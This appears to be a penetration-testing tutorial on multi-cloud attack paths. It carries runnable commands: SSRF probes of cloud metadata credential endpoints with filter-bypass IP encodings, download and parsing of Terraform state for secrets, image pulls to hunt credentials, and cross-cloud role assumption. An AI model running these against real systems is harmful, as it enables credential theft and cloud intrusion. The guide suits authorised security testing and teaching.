Multi-Cloud Attack Patterns
Most serious targets aren't single-cloud. They run primary infra on AWS, use Firebase for the mobile app, store assets in GCP, and have a legacy chunk on Azure. That fragmentation creates seams - inconsistent access controls, secrets that work across providers, and infrastructure configs that get checked into repos alongside application code.
Metadata Service Exploitation
The metadata service pattern is the same across providers but the headers and paths differ. Write a reusable test for all three when you have SSRF.
# Quick SSRF probe for all three metadata services
targets = [
    # AWS - no special headers needed (IMDSv1)
    ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    # GCP - needs Metadata-Flavor: Google
    ("GCP", "metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    # Azure - needs Metadata: true
    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
]
 
# When testing via SSRF, try all three and also try alternate IP representations:
# 169.254.169.254 == 0xa9fea9fe == 2852039166 == 0251.0376.0251.0376
If the SSRF strips URLs with 169.254.169.254, try:

http://169.254.169.254 (decimal)
http://0xa9fea9fe (hex)
http://2852039166 (integer)
http://[::ffff:169.254.169.254] (IPv6 mapped)
metadata.google.internal (GCP DNS alias)
DNS rebinding if you can set up an external DNS record

Terraform State File Exposure
Terraform state files are goldmines. They contain the full configuration of all managed infrastructure including sensitive values that weren't marked as sensitive in the provider. I've found database passwords, API keys, and private keys in state files.
State is commonly stored in:

S3 buckets (AWS) - usually named something like company-terraform-state or infra-tfstate
GCS buckets (GCP)
Azure Blob Storage
Terraform Cloud (check for public workspaces)

# If you find a terraform state S3 bucket
aws s3 ls s3://BUCKET_NAME --recursive
aws s3 cp s3://BUCKET_NAME/path/to/terraform.tfstate /tmp/state.json
 
# Parse it for sensitive values
cat /tmp/state.json | python3 -c "
import json, sys
state = json.load(sys.stdin)
for resource in state.get('resources', []):
    for instance in resource.get('instances', []):
        attrs = instance.get('attributes', {})
        for k, v in attrs.items():
            if any(x in k.lower() for x in ['password', 'secret', 'key', 'token']):
                print(f'{resource[\"type\"]}.{resource[\"name\"]}.{k}: {v}')
"
Also look for .tfstate files in repos - devs frequently commit local state before configuring remote backends.
Container Registry Exposure
Public or weakly-authenticated container registries let you pull images and inspect them for secrets, credentials, and internal tooling.
# AWS ECR - check for public repositories
aws ecr-public describe-repositories --region us-east-1
 
# Pull and inspect
docker pull public.ecr.aws/ALIAS/REPO:TAG
docker history IMAGE_ID --no-trunc
docker run --rm -it IMAGE_ID sh  # if it has a shell
# Or use dive for layer analysis:
dive IMAGE_ID
 
# GCP Artifact Registry / GCR
gcloud container images list --repository=gcr.io/PROJECT_ID
docker pull gcr.io/PROJECT_ID/IMAGE:TAG
 
# Azure Container Registry
az acr repository list --name REGISTRY_NAME
What I look for in images:

Env vars baked in (ENV AWS_SECRET_KEY=... in Dockerfile)
.aws/credentials or similar config files copied into the image
Private keys, certificates
Hardcoded database URLs in app config files
Internal service names and ports that reveal network topology

Cross-Cloud Trust Relationships
AWS roles can be configured to trust external identity providers, including Google and Azure. This creates cross-cloud attack paths:
# AWS role with Google OIDC federation
# If you have a GCP service account token, you might be able to assume an AWS role
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::ACCOUNT:role/ROLE \
  --role-session-name test \
  --web-identity-token GCP_ID_TOKEN
Also check GitHub Actions OIDC federation - if a GH Actions workflow has permission to assume an AWS or GCP role via OIDC, compromising the workflow gives you cloud access without needing static credentials.
Infrastructure as Code Recon
When you find a public repo or a leaked archive containing IaC:
# Terraform -- look for resource definitions and data sources
grep -r "aws_secretsmanager_secret\|aws_ssm_parameter\|password\|secret_key" .
 
# CloudFormation -- check for hardcoded values and exported outputs
grep -r "NoEcho\|Password\|SecretAccessKey\|export" .
 
# Pulumi -- TypeScript/Python code, easier to grep
grep -r "secret\|password\|apikey" . --include="*.ts" --include="*.py"
 
# Ansible -- vault files, variable files
find . -name "*.yml" | xargs grep -l "password\|vault\|secret"
CloudFormation templates sometimes have Outputs that export sensitive values. These are visible to anyone with cloudformation:DescribeStacks in the same account.
